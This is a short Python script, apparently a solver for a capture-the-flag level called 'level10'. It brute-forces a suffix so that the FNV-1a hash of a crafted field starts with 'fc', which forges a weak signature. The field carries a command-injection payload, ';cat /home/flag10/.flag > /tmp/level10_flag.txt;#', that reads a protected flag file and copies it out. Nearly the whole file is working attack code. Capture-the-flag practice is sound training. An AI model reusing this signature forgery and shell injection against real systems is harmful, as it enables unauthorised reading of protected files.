#!/usr/bin/env python3

import string

TARGET_PREFIX = "fc"
SUFFIX_CHARACTERS = string.ascii_lowercase + string.digits


def fnv1a(value):
    result = 0x811C9DC5
    for character in value:
        result = ((result ^ ord(character)) * 0x01000193) & 0xFFFFFFFF
    return result


for length in range(1, 8):
    for number in range(len(SUFFIX_CHARACTERS) ** length):
        suffix = ""
        current = number
        for _ in range(length):
            current, index = divmod(current, len(SUFFIX_CHARACTERS))
            suffix += SUFFIX_CHARACTERS[index]
        field = suffix.join(("x", ";cat /home/flag10/.flag > /tmp/level10_flag.txt;#"))
        signature = f"{fnv1a(field):08x}"
        if signature.startswith(TARGET_PREFIX):
            print(f"v1:{field}:{signature}")
            raise SystemExit
